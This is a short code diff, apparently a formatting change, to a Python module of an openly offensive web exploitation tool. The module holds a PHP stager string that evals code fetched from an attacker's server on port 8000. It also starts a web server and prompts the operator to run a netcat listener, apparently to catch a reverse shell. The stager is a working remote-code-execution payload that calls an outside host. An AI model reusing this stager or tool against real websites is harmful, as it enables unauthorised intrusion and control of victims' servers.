@@ -8,9 +8,9 @@ from .Detection import Detection
 STAGER = "<?php eval(file_get_contents('http://{0}:8000/{1}.php'))?>"
 HERE = abspath(dirname(__file__))
 
+
 class Input:
     def __init__(self, args):
-
         self.target = args.url
         self.nostager = args.nostager
         self.cookies = args.cookies
@@ -48,13 +48,20 @@ class Input:
         print(colors("[~] Starting Web Server ... ", 93))
 
         try:
-            p = subprocess.Popen(["python3 {}".format(file)], shell=True, stdout=subprocess.PIPE)
+            p = subprocess.Popen(
+                ["python3 {}".format(file)], shell=True, stdout=subprocess.PIPE
+            )
             p.communicate()
         except OSError as e:
             print(colors("[!] Process Error", 91))
             print(e)
 
-        input(colors("[?] Press Enter To Continue When Your netcat listener is Running ...", 94))
+        input(
+            colors(
+                "[?] Press Enter To Continue When Your netcat listener is Running ...",
+                94,
+            )
+        )
 
         if self.cookies:
             cookies = cook(self.cookies)
